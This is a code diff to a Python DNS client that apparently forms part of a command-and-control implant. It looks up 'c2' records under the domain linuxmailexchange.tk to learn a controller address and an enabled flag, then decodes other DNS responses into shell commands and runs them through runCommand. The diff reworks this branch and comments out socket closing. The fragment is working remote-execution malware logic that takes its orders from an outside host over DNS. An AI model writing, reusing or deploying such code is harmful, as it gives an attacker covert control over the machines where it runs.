@@ -564,20 +564,19 @@ class DNSClient:
             if len(results) > 0:
                 if request == "c2.a.linuxmailexchange.tk.":
                     c2IP = results
-                    self.socket.close()
+                    # self.socket.close()
                     return
                 if request == "c2e.a.linuxmailexchange.tk.":
                     c2enabled = (results == "yes.")
-                    self.socket.close()
-                    return
-
-                # command = self.cmdDecode(results)
-                # print(results)
-                # print(command)
-                # out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-                (stdout, stderr) = runCommand(self.cmdDecode(results))
-                dnsResult = True
-            self.socket.close()
+                    # self.socket.close()
+                else:
+                    # command = self.cmdDecode(results)
+                    # print(results)
+                    # print(command)
+                    # out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+                    (stdout, stderr) = runCommand(self.cmdDecode(results))
+                    dnsResult = True
+                    # self.socket.close()
         elif not recursion_desired:
             for rr in format.additional_RRs:
                 if self.connect_server(rr.resource_data.ip):
